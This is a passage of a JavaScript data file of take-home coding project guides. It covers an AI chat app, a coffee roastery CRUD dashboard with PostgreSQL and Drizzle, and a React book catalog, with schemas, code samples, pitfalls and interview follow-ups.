        { method: 'DELETE', path: '/api/conversations/:id', response: '204 No Content — cascades to messages' },
        { method: 'PATCH', path: '/api/conversations/:id', response: '{ id, title } — rename conversation' },
        { method: 'POST', path: '/api/chat/stream', response: 'SSE stream: data: {token}\\n\\n per chunk, data: [DONE]\\n\\n on finish' },
      ],
    },
    codeExamples: {
      typescript: `// hooks/useStream.ts — core streaming implementation
import { useState, useRef, useCallback } from 'react';

interface UseStreamOptions {
  onComplete?: (fullText: string) => void;
}

export function useStream({ onComplete }: UseStreamOptions = {}) {
  const [streamingText, setStreamingText] = useState('');
  const [isStreaming, setIsStreaming] = useState(false);
  const accumulatedRef = useRef('');

  const startStream = useCallback(async (conversationId: string, userMessage: string) => {
    setIsStreaming(true);
    setStreamingText('');
    accumulatedRef.current = '';

    const response = await fetch('/api/chat/stream', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ conversation_id: conversationId, message: userMessage }),
    });

    if (!response.body) throw new Error('No response body');

    const reader = response.body.getReader();
    const decoder = new TextDecoder();

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;

      const chunk = decoder.decode(value, { stream: true });
      // Parse SSE format: "data: token\\n\\n"
      const lines = chunk.split('\\n').filter(l => l.startsWith('data: '));
      for (const line of lines) {
        const token = line.slice(6); // remove "data: "
        if (token === '[DONE]') continue;
        accumulatedRef.current += token;
        setStreamingText(accumulatedRef.current);
      }
    }

    setIsStreaming(false);
    onComplete?.(accumulatedRef.current);
  }, [onComplete]);

  return { streamingText, isStreaming, startStream };
}`,
    },
    tradeoffDecisions: [
      { choice: 'SSE vs WebSocket', picked: 'SSE', reason: 'Chat is unidirectional (server streams tokens to client). SSE is simpler — it works over regular HTTP, has automatic reconnection, and requires no special server infrastructure. WebSocket adds complexity with no benefit for this use case.' },
      { choice: 'FastAPI vs Node.js backend', picked: 'FastAPI', reason: 'The OpenAI Python SDK is the first-class client. FastAPI\'s async support and StreamingResponse make SSE trivial to implement. TypeScript backends require workarounds for streaming that Python handles natively.' },
      { choice: 'In-memory state vs PostgreSQL', picked: 'PostgreSQL', reason: 'The project spec requires conversation persistence. In-memory state is lost on server restart. PostgreSQL with a simple two-table schema adds minimal complexity and demonstrates full-stack competence that evaluators value.' },
      { choice: 'Next.js App Router vs Pages Router', picked: 'App Router', reason: 'App Router is the current Next.js default and what evaluators expect in 2024+. Server Components can pre-fetch conversation list, reducing client-side loading states. Pages Router is legacy.' },
    ],
    deepDiveTopics: [
      { topic: 'SSE vs WebSocket trade-offs', detail: 'SSE (Server-Sent Events) uses a persistent HTTP connection where only the server pushes data. It automatically reconnects, works through HTTP/2 multiplexing, and needs no special infrastructure. WebSocket provides full duplex but requires maintaining connection state on the server. For token streaming, SSE is strictly superior — the only time WebSocket makes sense is if you need the client to push mid-stream (e.g., "stop generating" via the same channel, though you can also do this with a separate HTTP request).' },
      { topic: 'Conversation context window management', detail: 'Language models have a context window (e.g., 128K tokens for GPT-4o). As conversations grow, you must decide what to include in the messages array. Strategies: 1) Always include all messages (simple, works until context limit), 2) Sliding window — last N messages, 3) Summarization — use an LLM call to compress old messages into a summary. For a take-home, strategy 1 is fine; mention the others to show awareness.' },
      { topic: 'Streaming and React re-render performance', detail: 'Appending one token at a time to React state causes a re-render per token (~30/second). For a 500-token response, that is 500 re-renders. Mitigation: accumulate tokens in a ref (no re-render), batch-update state every 50ms with setInterval, or use React 18 automatic batching. The ref approach is simplest and most performant.' },
      { topic: 'Markdown rendering security', detail: 'Rendering raw AI-generated markdown as HTML creates XSS risks. Always use react-markdown with rehype-sanitize (or use the default safe renderer). Never use dangerouslySetInnerHTML with AI output. For code blocks, add rehype-highlight for syntax highlighting and a copy-to-clipboard button on the <pre> element.' },
    ],
    commonPitfalls: [
      { pitfall: 'Blocking the event loop during streaming', why: 'If you use synchronous database writes inside the streaming loop, each token insert blocks other requests. A 200-token response with synchronous writes could lock the server for seconds.', solution: 'Buffer the full response in memory during streaming, then write the complete message to the database in a single INSERT after the stream ends.' },
      { pitfall: 'Not including conversation history in API calls', why: 'Sending only the latest user message means the AI has no memory — it cannot refer to earlier messages, making multi-turn conversation impossible.', solution: 'Fetch all messages for the conversation from the database, map to [{role, content}] format, append the new user message, and send the full array to the OpenAI API.' },
      { pitfall: 'Auto-scrolling fighting user scroll position', why: 'If you always scroll to the bottom on every new token, users cannot read earlier messages while streaming is in progress.', solution: 'Track whether the user has manually scrolled up using a scroll event listener. Only auto-scroll if the user is at (or near) the bottom — within 100px of the scroll container\'s bottom.' },
      { pitfall: 'Docker networking misconfiguration', why: 'The frontend container cannot reach localhost:8000 because localhost inside a container refers to the container itself, not the host.', solution: 'In docker-compose.yml, use the service name as the hostname: BACKEND_URL=http://backend:8000. For browser-side API calls, use the host machine\'s port mapping (localhost:8000) via Next.js rewrites or environment variables.' },
    ],
    edgeCases: [
      { scenario: 'OpenAI API rate limit (429) mid-stream', impact: 'The SSE connection drops after partial response. The database has no message for that turn. The UI shows a truncated response.', mitigation: 'Catch 429 errors in the streaming generator. Send a SSE error event to the client. On the client, show a "Rate limited — try again in Xs" message. Do not persist the partial message.' },
      { scenario: 'User closes browser tab during streaming', impact: 'The SSE connection closes. The backend generator may continue running and consuming API credits.', mitigation: 'Use request.is_disconnected() (FastAPI) or listen for the disconnect signal to cancel the generator. Wrap the streaming loop in a try/finally to ensure cleanup runs even on abrupt connection close.' },
      { scenario: 'Very long AI response exceeding VARCHAR limit', impact: 'Database INSERT fails with a string truncation error for responses over the column limit.', mitigation: 'Use TEXT type (unlimited length) for the content column in PostgreSQL, not VARCHAR(n). TEXT is equally performant and has no length limit.' },
      { scenario: 'Concurrent requests to the same conversation', impact: 'Two users or browser tabs sending messages simultaneously causes message ordering to be non-deterministic.', mitigation: 'Disable the send button while a stream is in progress. On the backend, use database-level SERIALIZABLE transactions if multiple writers are a real concern.' },
    ],
    interviewFollowups: [
      { question: 'How would you add user authentication?', answer: 'Add a users table and associate conversations with user_id. Use NextAuth.js on the frontend (Google/GitHub OAuth). Protect all API routes with a JWT middleware that extracts user_id from the Authorization header. Filter all conversation queries by the authenticated user_id.' },
      { question: 'How would you scale this to 10,000 concurrent streaming connections?', answer: 'SSE connections are long-lived and lightweight (no heavy WebSocket handshake). FastAPI with uvicorn handles many concurrent connections via async I/O. Horizontal scaling: deploy multiple backend instances behind a load balancer. The stateless design (all state in PostgreSQL) means any instance can handle any request.' },
      { question: 'How would you implement a "stop generating" button?', answer: 'On the frontend, store an AbortController per stream request. The stop button calls controller.abort(), which closes the fetch connection. On the backend, detect the disconnect via request.is_disconnected() and break out of the streaming generator loop. Persist whatever was accumulated up to that point.' },
      { question: 'How would you add support for multiple AI models?', answer: 'Add a model field to the conversation or message. Create a model selector in the UI (GPT-4o, GPT-3.5, Claude 3.5 Sonnet). In the backend, route to the appropriate API client based on the model name. Abstract the streaming interface so both OpenAI and Anthropic clients implement the same async generator protocol.' },
    ],
    extensionIdeas: [
      { idea: 'Conversation search', difficulty: 'beginner', description: 'Add full-text search across all messages using PostgreSQL\'s ts_vector. Show matching conversations in the sidebar with the matching snippet highlighted. Enables users to find past answers quickly.' },
      { idea: 'Image upload and vision', difficulty: 'intermediate', description: 'Allow users to upload images via drag-and-drop. Store in S3 or local filesystem, send the image URL in the messages array using the vision message format. Display uploaded images inline in the chat history.' },
      { idea: 'Custom system prompts (personas)', difficulty: 'beginner', description: 'Let users set a system prompt per conversation (e.g., "You are a code reviewer"). Add a settings gear icon in the chat header. Prepend the system message to the messages array on every API call.' },
      { idea: 'Branching conversations', difficulty: 'advanced', description: 'Allow users to fork from any message to explore a different direction. Store parent_message_id to create a tree structure. Render branches as tabs or a visual tree. This mirrors how ChatGPT\'s branch feature works internally.' },
    ],
  },
  {
    id: 'coffee-roastery-dashboard',
    title: 'Coffee Roastery Dashboard',
    icon: 'database',
    color: '#92400e',
    difficulty: 'intermediate',
    estimatedTime: '5-6 hours',
    techStack: ['React', 'Next.js', 'TypeScript', 'PostgreSQL', 'Docker', 'Drizzle ORM'],
    questions: 4,
    description: 'Build a full-stack dashboard for managing coffee bean inventory, roast profiles, and orders with CRUD operations, filtering, and data visualization.',
    introduction: 'Create a data management application with a real database. Users can browse coffee beans, filter by origin/roast level, view detailed profiles, and manage inventory. This project tests your full-stack fundamentals: database schema design, API routes, and interactive table UI.',
    interviewRelevance: 'Common take-home format: "Build a CRUD app with a real database." Tests schema design, API layer, table component with sorting/filtering, and Docker containerization. Evaluators look for clean data flow, error handling, and code organization.',
    learningObjectives: [
      'Design a PostgreSQL schema with relationships (beans, roasts, orders)',
      'Build API routes with Drizzle ORM for type-safe database queries',
      'Create interactive data tables with sorting, filtering, and pagination',
      'Implement Docker Compose setup for app + database',
    ],
    keyQuestions: [
      { question: 'What should the database schema look like?', answer: 'Three core tables: coffee_beans (id, name, origin, variety, altitude, process, flavor_notes[], roast_level), roast_profiles (id, bean_id, temperature_curve, duration, roast_date), and orders (id, bean_id, quantity, status, customer_name, created_at). Add indexes on origin, roast_level, and status for filtering performance.' },
      { question: 'How do I build the interactive table?', answer: 'Build a reusable DataTable component with: column definitions (sortable, filterable flags), server-side pagination via query params (?page=1&limit=20&sort=name&order=asc), column-specific filters (dropdown for enums, text search for strings), and row click for detail view.' },
      { question: 'What makes a take-home submission stand out?', answer: 'Seeded data (50+ beans, multiple roast profiles), comprehensive error handling (validation, 404s, conflict resolution), loading states, empty states, responsive design, and a clear README with schema diagram and API documentation.' },
      { question: 'How should I structure the Next.js routes?', answer: 'API routes: /api/beans (GET list, POST create), /api/beans/[id] (GET detail, PUT update, DELETE). Pages: /dashboard (overview stats), /beans (table), /beans/[id] (detail), /roasts (roast profiles), /orders (order management). Use Next.js API routes with Drizzle for the backend layer.' },
    ],
    implementationSteps: [
      { phase: 1, title: 'Docker & Database Setup', description: 'Get PostgreSQL running locally in Docker and connect Drizzle ORM so you can run migrations and seed data before writing any UI.', tasks: ['Write docker-compose.yml with postgres:16 service and a named volume for persistence', 'Initialize Next.js 14 with TypeScript, install drizzle-orm, drizzle-kit, and pg', 'Define Drizzle schema in src/db/schema.ts for coffee_beans, roast_profiles, and orders', 'Run drizzle-kit generate then drizzle-kit migrate to create tables', 'Write seed script src/db/seed.ts with 50 realistic coffee beans across 10 origins'] },
      { phase: 2, title: 'API Routes', description: 'Build all REST endpoints using Next.js Route Handlers with Drizzle queries, Zod validation, and proper HTTP semantics.', tasks: ['Implement GET /api/beans with query param parsing for page, limit, sort, order, origin, roast_level', 'Build POST /api/beans with Zod validation and Drizzle insert', 'Add GET, PUT, DELETE /api/beans/[id] with 404 handling for missing records', 'Create GET /api/beans/[id]/roasts for related roast profiles', 'Add GET /api/dashboard/stats for total beans, orders by status, and top origins'] },
      { phase: 3, title: 'Data Table Component', description: 'Build a reusable server-driven DataTable with column sorting, filters, pagination, and row actions.', tasks: ['Create DataTable component accepting column definitions with { key, label, sortable, render? }', 'Implement URL-synced state via useSearchParams for page, sort, order, and all filter values', 'Add column header click to toggle sort direction with an up/down visual indicator', 'Build filter row below headers: text input for strings, select dropdown for enum columns', 'Add a row actions dropdown (View, Edit, Delete) with a confirmation dialog for destructive actions'] },
      { phase: 4, title: 'Detail Pages & Dashboard', description: 'Build bean detail/edit page, the overview dashboard with summary stats, and final Docker production polish.', tasks: ['Create /beans/[id] page with inline read/edit toggle, flavor notes tags, and linked roast profiles', 'Build /beans/new page with a controlled form, client-side Zod validation, and redirect on save', 'Add /dashboard page with stat cards (total beans, pending orders) and a bar chart by origin', 'Write multi-stage Dockerfile for Next.js using standalone output mode for a lean image', 'Final README with ASCII schema diagram, API reference table, and one-command setup instructions'] },
    ],
    fileStructure: `coffee-roastery-dashboard/
├── docker-compose.yml
├── Dockerfile
├── .env.example
├── README.md
├── drizzle.config.ts
├── package.json
└── src/
    ├── app/
    │   ├── layout.tsx
    │   ├── page.tsx
    │   ├── dashboard/page.tsx
    │   ├── beans/
    │   │   ├── page.tsx
    │   │   ├── new/page.tsx
    │   │   └── [id]/page.tsx
    │   ├── roasts/page.tsx
    │   ├── orders/page.tsx
    │   └── api/
    │       ├── beans/
    │       │   ├── route.ts
    │       │   └── [id]/
    │       │       ├── route.ts
    │       │       └── roasts/route.ts
    │       └── dashboard/stats/route.ts
    ├── components/
    │   ├── DataTable.tsx
    │   ├── BeanForm.tsx
    │   ├── StatCard.tsx
    │   ├── FilterBar.tsx
    │   └── ConfirmDialog.tsx
    ├── db/
    │   ├── index.ts
    │   ├── schema.ts
    │   ├── seed.ts
    │   └── migrations/
    └── lib/
        ├── validations.ts
        └── utils.ts`,
    architectureLayers: [
      { name: 'Page Layer', description: 'Next.js App Router server components fetch initial data via direct Drizzle calls with no HTTP round-trip, passing data down to client components for interactivity.' },
      { name: 'API Route Layer', description: 'Next.js Route Handlers at /api/* handle client-triggered mutations and paginated list fetches. All responses are typed using the same Zod schemas used for request validation.' },
      { name: 'Data Access Layer', description: 'Drizzle ORM queries centralized in src/db/ — a type-safe SQL builder with full schema inference. All filter, sort, and pagination logic lives here, not scattered across route handlers.' },
      { name: 'Validation Layer', description: 'Zod schemas in lib/validations.ts define the shapes of API request bodies and query params, shared between client-side form validation and server-side request parsing.' },
      { name: 'Component Layer', description: 'Reusable UI components including DataTable, BeanForm, and StatCard. DataTable accepts generic column definitions and a data array, keeping it fully decoupled from the coffee domain model.' },
      { name: 'Infrastructure Layer', description: 'Docker Compose connects the Next.js app container and PostgreSQL container on a shared bridge network. A named volume ensures data persists across container restarts and removals.' },
    ],
    dataModel: {
      description: 'Three tables: coffee_beans as the central entity, roast_profiles as a one-to-many child (each bean has multiple roast sessions), and orders as independent purchase transactions referencing beans.',
      schema: `CREATE TABLE coffee_beans (
  id            SERIAL PRIMARY KEY,
  name          VARCHAR(100) NOT NULL,
  origin        VARCHAR(100) NOT NULL,
  variety       VARCHAR(100),
  altitude_m    INTEGER,
  process       VARCHAR(50),
  flavor_notes  TEXT[],
  roast_level   VARCHAR(20) NOT NULL
                CHECK (roast_level IN ('light','medium','medium-dark','dark')),
  stock_kg      DECIMAL(8,2) NOT NULL DEFAULT 0,
  price_per_kg  DECIMAL(8,2),
  created_at    TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE TABLE roast_profiles (
  id              SERIAL PRIMARY KEY,
  bean_id         INTEGER NOT NULL REFERENCES coffee_beans(id) ON DELETE CASCADE,
  roast_date      DATE NOT NULL,
  duration_min    INTEGER,
  first_crack_sec INTEGER,
  end_temp_c      INTEGER,
  notes           TEXT,
  created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE TABLE orders (
  id            SERIAL PRIMARY KEY,
  bean_id       INTEGER NOT NULL REFERENCES coffee_beans(id),
  customer_name VARCHAR(100) NOT NULL,
  quantity_kg   DECIMAL(8,2) NOT NULL,
  status        VARCHAR(20) NOT NULL DEFAULT 'pending'
                CHECK (status IN ('pending','processing','shipped','delivered','cancelled')),
  created_at    TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_beans_origin      ON coffee_beans(origin);
CREATE INDEX idx_beans_roast_level ON coffee_beans(roast_level);
CREATE INDEX idx_orders_status     ON orders(status);
CREATE INDEX idx_roasts_bean_id    ON roast_profiles(bean_id);`,
    },
    apiDesign: {
      description: 'REST API using Next.js Route Handlers. List endpoints support server-side pagination, sorting, and filtering via query parameters. All mutation endpoints validate with Zod before touching the database.',
      endpoints: [
        { method: 'GET', path: '/api/beans?page=1&limit=20&sort=name&order=asc&origin=Ethiopia', response: '{ data: CoffeeBean[], total: number, page: number, totalPages: number }' },
        { method: 'POST', path: '/api/beans', response: 'Created CoffeeBean — 201 status, or 422 with Zod field-level errors' },
        { method: 'GET', path: '/api/beans/:id', response: 'CoffeeBean with roast_profiles array joined — 404 if not found' },
        { method: 'PUT', path: '/api/beans/:id', response: 'Updated CoffeeBean — 404 for missing record, 422 for validation errors' },
        { method: 'DELETE', path: '/api/beans/:id', response: '204 No Content — cascades to roast_profiles; 409 if active orders exist' },
        { method: 'GET', path: '/api/dashboard/stats', response: '{ totalBeans, totalStock, ordersByStatus: Record<string,number>, topOrigins: {origin,count}[] }' },
      ],
    },
    codeExamples: {
      typescript: `// db/schema.ts — Drizzle schema with full type inference
import { pgTable, serial, varchar, integer, decimal, text, timestamp } from 'drizzle-orm/pg-core';

export const coffeeBeans = pgTable('coffee_beans', {
  id:          serial('id').primaryKey(),
  name:        varchar('name', { length: 100 }).notNull(),
  origin:      varchar('origin', { length: 100 }).notNull(),
  variety:     varchar('variety', { length: 100 }),
  altitudeM:   integer('altitude_m'),
  process:     varchar('process', { length: 50 }),
  flavorNotes: text('flavor_notes').array(),
  roastLevel:  varchar('roast_level', { length: 20 }).notNull(),
  stockKg:     decimal('stock_kg', { precision: 8, scale: 2 }).notNull().default('0'),
  pricePerKg:  decimal('price_per_kg', { precision: 8, scale: 2 }),
  createdAt:   timestamp('created_at').notNull().defaultNow(),
});

// app/api/beans/route.ts — paginated, filtered list endpoint
import { db } from '@/db';
import { coffeeBeans } from '@/db/schema';
import { eq, count, asc, desc } from 'drizzle-orm';
import { NextRequest, NextResponse } from 'next/server';

export async function GET(req: NextRequest) {
  const sp     = req.nextUrl.searchParams;
  const page   = Math.max(1, Number(sp.get('page') ?? 1));
  const limit  = Math.min(100, Number(sp.get('limit') ?? 20));
  const origin = sp.get('origin');
  const order  = sp.get('order') === 'desc' ? desc : asc;
  const where  = origin ? eq(coffeeBeans.origin, origin) : undefined;

  const [rows, [{ value: total }]] = await Promise.all([
    db.select({ id: coffeeBeans.id, name: coffeeBeans.name,
                origin: coffeeBeans.origin, roastLevel: coffeeBeans.roastLevel,
                stockKg: coffeeBeans.stockKg })
      .from(coffeeBeans).where(where)
      .orderBy(order(coffeeBeans.name))
      .limit(limit).offset((page - 1) * limit),
    db.select({ value: count() }).from(coffeeBeans).where(where),
  ]);

  return NextResponse.json({ data: rows, total: Number(total), page,
    totalPages: Math.ceil(Number(total) / limit) });
}`,
    },
    tradeoffDecisions: [
      { choice: 'Drizzle ORM vs Prisma', picked: 'Drizzle ORM', reason: "The spec calls for Drizzle. It produces transparent SQL-like query builders — you can predict the exact SQL generated. Prisma\'s generated client is more opaque with a heavier runtime footprint." },
      { choice: 'Server-side vs client-side filtering', picked: 'Server-side filtering', reason: 'Database-level filtering with indexes scales to any dataset size and demonstrates the SQL skills evaluators are testing. Client-side filtering breaks at scale and misses the point of the project.' },
      { choice: 'Next.js Route Handlers vs separate Express backend', picked: 'Next.js Route Handlers', reason: 'Single deployable unit in Docker simplifies evaluator setup. No CORS config needed. Route Handlers share the same TypeScript types as the UI, enabling end-to-end type safety.' },
      { choice: 'URL query state vs React useState for filters', picked: 'URL state via useSearchParams', reason: 'URL-synced filters survive page refreshes, are shareable, and support browser back/forward navigation — a professional pattern that evaluators notice.' },
    ],
    deepDiveTopics: [
      { topic: 'Drizzle ORM type inference', detail: 'Drizzle infers TypeScript types directly from schema definitions — no separate type file to maintain. The select() return type exactly reflects queried columns, and joins produce correctly merged types. drizzle-kit generates inspectable SQL migration files you can version-control, giving full visibility into every schema change.' },
      { topic: 'PostgreSQL TEXT[] array columns', detail: 'Native array columns map cleanly to JavaScript string arrays. For filtering by flavor note, use the @> (contains) operator: WHERE flavor_notes @> ARRAY[\'blueberry\']. A GIN index on the column makes this O(log n) at scale. Drizzle\'s .array() modifier handles serialization and deserialization automatically.' },
      { topic: 'Docker multi-stage builds for Next.js', detail: 'Naively copying node_modules produces a 1GB+ image. Next.js standalone output mode (output: "standalone" in next.config.js) bundles only runtime-required files. Multi-stage Dockerfile: stage 1 installs deps and builds, stage 2 copies only .next/standalone into clean node:20-alpine. Final image: ~200MB.' },
      { topic: 'Offset vs cursor-based pagination', detail: 'LIMIT/OFFSET pagination scans and discards all preceding rows: page 500 of 10,000 rows reads 9,980 rows to return 20. Cursor pagination (WHERE id > $lastId LIMIT 20) uses an index seek, constant-time regardless of page. For a take-home, offset is fine — mentioning cursor pagination signals senior-level DB awareness.' },
    ],
    commonPitfalls: [
      { pitfall: 'N+1 queries in list views', why: 'Fetching all orders then running a per-row bean-name query produces 51 queries for 50 rows. The table feels slow and the network tab reveals the problem.', solution: 'Use a single Drizzle join: .from(orders).leftJoin(coffeeBeans, eq(orders.beanId, coffeeBeans.id)) to get all data in one query.' },
      { pitfall: 'Data loss on docker-compose down', why: 'Without a named volume the postgres container stores data in an ephemeral writable layer destroyed on container removal.', solution: 'Declare a named volume in docker-compose.yml (postgres_data:) and mount it at /var/lib/postgresql/data in the service definition.' },
      { pitfall: 'Connection pool exhaustion in dev', why: 'Next.js hot reload re-executes module-level code, creating a new Drizzle connection pool each time without closing the old one. PostgreSQL hits its default 100-connection limit quickly.', solution: 'Use a dev singleton pattern: if (!global.__db) { global.__db = drizzle(pool); } export const db = global.__db;' },
      { pitfall: 'Over-fetching in list endpoints', why: 'Selecting all columns including large TEXT[] arrays for every row in the table view wastes bandwidth and slows rendering.', solution: 'Partial select for list endpoints — only id, name, origin, roastLevel, stockKg. Fetch the full record including flavorNotes only on the detail page.' },
    ],
    edgeCases: [
      { scenario: 'Deleting a bean with existing orders', impact: 'FK constraint violation — DELETE fails with a cryptic 500 error if orders references coffee_beans without a CASCADE or soft-delete mechanism.', mitigation: 'Catch pg error code 23503 (foreign key violation) and return 409 Conflict: "Cannot delete bean with active orders. Cancel all orders first."' },
      { scenario: 'Concurrent stock decrements', impact: 'Two simultaneous orders both read stock = 10, both subtract 8, both write 2. Actual remaining stock should be -6 — this is classic overselling.', mitigation: 'Atomic SQL: UPDATE coffee_beans SET stock_kg = stock_kg - $qty WHERE id = $id AND stock_kg >= $qty. If rowsAffected === 0, return 409 Insufficient stock.' },
      { scenario: 'Unvalidated sort parameter', impact: 'Interpolating a sort query param directly into SQL enables ORDER BY injection attacks.', mitigation: 'Validate the sort value against a hardcoded column whitelist. Default to "name" for unrecognized values. Use Drizzle column references rather than string interpolation.' },
      { scenario: 'App starts before migrations run', impact: 'API calls fail with "relation does not exist" on a fresh clone or CI run where tables have not been created.', mitigation: 'In the Docker entrypoint script, run npm run db:migrate before starting Next.js. Log a clear diagnostic message if the migration fails.' },
    ],
    interviewFollowups: [
      { question: 'How would you add authentication and per-user data isolation?', answer: 'Add a users table and associate all records with a user_id. Use NextAuth.js for Google OAuth or credentials auth. Add where(eq(table.userId, session.user.id)) to all Drizzle queries. Protect mutation routes with a session check middleware.' },
      { question: 'How would you push real-time stock changes to all open tabs?', answer: 'Use PostgreSQL LISTEN/NOTIFY triggered on stock updates. The Next.js server holds a persistent pg client that forwards events to browsers via SSE. Each browser tab updates table rows in-place through React state without a full-page reload.' },
      { question: 'How would you add CSV export?', answer: 'GET /api/beans/export queries without a pagination limit, serializes rows with fast-csv, and streams the response with Content-Type: text/csv and Content-Disposition: attachment; filename=beans.csv. The frontend triggers download via a plain anchor tag.' },
      { question: 'How would you scale to 1 million records?', answer: 'Existing indexes handle millions of rows well. Additional: composite index on (origin, roast_level) for combined filters, materialized view for dashboard stats refreshed every 5 minutes, cursor-based pagination to eliminate OFFSET scans, and a read replica for analytics workloads.' },
    ],
    extensionIdeas: [
      { idea: 'CSV import for bulk bean upload', difficulty: 'beginner', description: 'File input accepting CSV, parsed client-side with PapaParse, row preview before submission, then POST to /api/beans/import using Drizzle bulk insert. Demonstrates file handling and batch data pipeline skills.' },
      { idea: 'Roast temperature curve chart', difficulty: 'intermediate', description: 'Add temperature_readings JSONB column to roast_profiles storing [{time_sec, temp_c}] data points. Render an interactive line chart with Recharts on the detail page for visual profile comparison across roasts.' },
      { idea: 'Low stock alerts on dashboard', difficulty: 'beginner', description: 'Add low_stock_threshold column to coffee_beans. Dashboard highlights beans below threshold with a warning badge. A /api/beans/low-stock endpoint drives the alert panel.' },
      { idea: 'Full-text search with PostgreSQL tsvector', difficulty: 'intermediate', description: 'Add a generated tsvector column indexing name, origin, and flavor_notes. Use to_tsquery in the list endpoint. Enables "blueberry Ethiopia" queries across all text fields — much faster than ILIKE at scale.' },
    ],
  },
  {
    id: 'rare-book-library',
    title: 'Rare Book Library',
    icon: 'book',
    color: '#b45309',
    difficulty: 'beginner',
    estimatedTime: '3-4 hours',
    techStack: ['React', 'Vite', 'Tailwind CSS', 'JavaScript'],
    questions: 4,
    description: 'Build a frontend book catalog with advanced filtering, search, sorting, detail views, and wishlist management — the classic frontend take-home.',
    introduction: 'Create a responsive book browsing application using a provided JSON dataset. Implement search across title/author, multi-criteria filtering (genre, year range, availability), sorting options, and a persistent wishlist. This is the most commonly assigned frontend take-home project.',
    interviewRelevance: 'The standard "frontend take-home" format. Evaluators check: component architecture, state management for filters, search debouncing, responsive grid/list layouts, accessibility, and clean code. This exact format appears at companies like Stripe, Notion, and Linear.',
    learningObjectives: [
      'Build a filter system with multiple criteria (genre, year range, availability, rating)',
      'Implement debounced search across multiple text fields (title, author, ISBN)',
      'Create responsive grid/list toggle layout with smooth transitions',
      'Add wishlist with localStorage persistence and undo-remove functionality',
    ],
    keyQuestions: [
      { question: 'How should I structure the filter state?', answer: 'Use a single filters object: { search: string, genres: string[], yearRange: [min, max], availability: boolean | null, rating: number | null, sortBy: string, sortOrder: "asc" | "desc" }. Apply all filters in a single useMemo chain for efficient recomputation.' },
      { question: 'How do I implement performant search?', answer: 'Debounce the search input (300ms) to avoid filtering on every keystroke. Use a memoized filter function that matches search text against title, author, and ISBN simultaneously. For large datasets (1000+ books), consider Fuse.js for fuzzy matching.' },
      { question: 'What UI details do evaluators notice?', answer: 'Loading states (skeleton cards), empty states ("No books match your filters" with a clear-filters button), smooth filter transitions, keyboard navigation, URL-synced filters (?genre=fiction&sort=year), accessible form controls, and focus management when switching views.' },
      { question: 'How do I make the grid/list toggle work well?', answer: 'Use CSS Grid with a state variable for layout mode. Grid mode: auto-fill columns with minmax(280px, 1fr). List mode: single column with horizontal card layout. Add a smooth height transition using layout animations (Framer Motion) or CSS transitions with fixed-height cards.' },
    ],
    implementationSteps: [
      { phase: 1, title: 'Project Setup & Data', description: 'Scaffold the Vite + React app, load the JSON book dataset, and verify data renders before building any filter logic.', tasks: ['Initialize Vite project with React and JavaScript templates, install Tailwind CSS', 'Create src/data/books.json with 50 realistic book entries covering genre, year, author, rating, availability, and ISBN fields', 'Build a BookCard component that renders a single book with all fields', 'Render the raw book array in a simple grid to verify data flow end-to-end', 'Set up React Router with / for the catalog and /books/:id for detail view'] },
      { phase: 2, title: 'Filter & Search State', description: 'Build the centralized filter state and the pure filter function that produces the visible book list from any combination of active filters.', tasks: ['Define a single filters state object: { search, genres, yearRange, availability, rating, sortBy, sortOrder }', 'Write a filterBooks(books, filters) pure function using Array.filter and Array.sort chained in useMemo', 'Implement debounced search input (300ms) using a custom useDebounce hook', 'Build genre multi-select component with checkbox list and active count badge', 'Add year range dual-handle slider and rating minimum selector'] },
      { phase: 3, title: 'Grid/List Layout & Wishlist', description: 'Build the responsive layout toggle between grid and list view, plus the localStorage-persisted wishlist with undo-remove.', tasks: ['Implement layout toggle (grid/list) with a CSS Grid className swap and smooth card transition', 'Build WishlistContext with add, remove, and undo-remove actions using a removedBuffer state', 'Persist wishlist to localStorage using useEffect with a JSON.stringify/parse round-trip', 'Show wishlist count badge in the header and a slide-out wishlist panel', 'Add empty state for both the book list ("No books match your filters") and the wishlist'] },
      { phase: 4, title: 'Detail View & Polish', description: 'Build the book detail page, URL-synced filters, and accessibility and performance polish.', tasks: ['Create /books/:id detail page with full metadata, availability badge, and Add to Wishlist button', 'Sync active filters to URL query params so filter state survives page refresh and is shareable', 'Add loading skeleton cards (CSS animation) shown while the initial data loads', 'Keyboard navigation: focusable cards, Enter to open detail, Escape to close modals', 'Final check: sort by title A-Z, Z-A, year newest/oldest, rating highest/lowest'] },
    ],
    fileStructure: `rare-book-library/
├── index.html
├── package.json
├── vite.config.js
├── tailwind.config.js
└── src/
    ├── main.jsx
    ├── App.jsx
    ├── data/
    │   └── books.json
    ├── contexts/
    │   └── WishlistContext.jsx
    ├── hooks/
    │   ├── useDebounce.js
    │   └── useLocalStorage.js
    ├── lib/
    │   └── filterBooks.js
    ├── components/
    │   ├── BookCard.jsx
    │   ├── BookGrid.jsx
    │   ├── FilterPanel.jsx
    │   ├── SearchBar.jsx
    │   ├── SortControls.jsx
    │   ├── WishlistPanel.jsx
    │   ├── LayoutToggle.jsx
    │   └── SkeletonCard.jsx
    └── pages/
        ├── CatalogPage.jsx
        └── BookDetailPage.jsx`,
    architectureLayers: [
      { name: 'Data Layer', description: 'Static books.json dataset loaded at module import time. No API calls — the entire dataset is in memory, enabling instant filtering and sorting without any network latency.' },
      { name: 'Filter Logic Layer', description: 'Pure filterBooks(books, filters) function in lib/filterBooks.js that chains Array.filter calls and sorts the result. Wrapped in useMemo so it only recomputes when books or filters change.' },
      { name: 'State Layer', description: 'Single filters object in CatalogPage state, passed down to filter controls and consumed by filterBooks. WishlistContext provides global wishlist state with localStorage persistence.' },
      { name: 'URL Sync Layer', description: 'useSearchParams hook syncs filter state to URL query params on change. On mount, initializes filter state from URL params — enables shareable filter URLs and refresh persistence.' },
      { name: 'Component Layer', description: 'Presentational components (BookCard, FilterPanel, WishlistPanel) receive props and emit callbacks. No internal state except for controlled input values.' },
      { name: 'Page Layer', description: 'CatalogPage orchestrates all state and renders the filter panel, book grid, and wishlist panel. BookDetailPage reads the book ID from URL params and displays full metadata.' },
    ],
    codeExamples: {
      typescript: `// lib/filterBooks.js — pure filter + sort function
export function filterBooks(books, filters) {
  const { search, genres, yearRange, availability, rating, sortBy, sortOrder } = filters;
  const query = search.toLowerCase().trim();

  let result = books.filter(book => {
    if (query && !book.title.toLowerCase().includes(query)
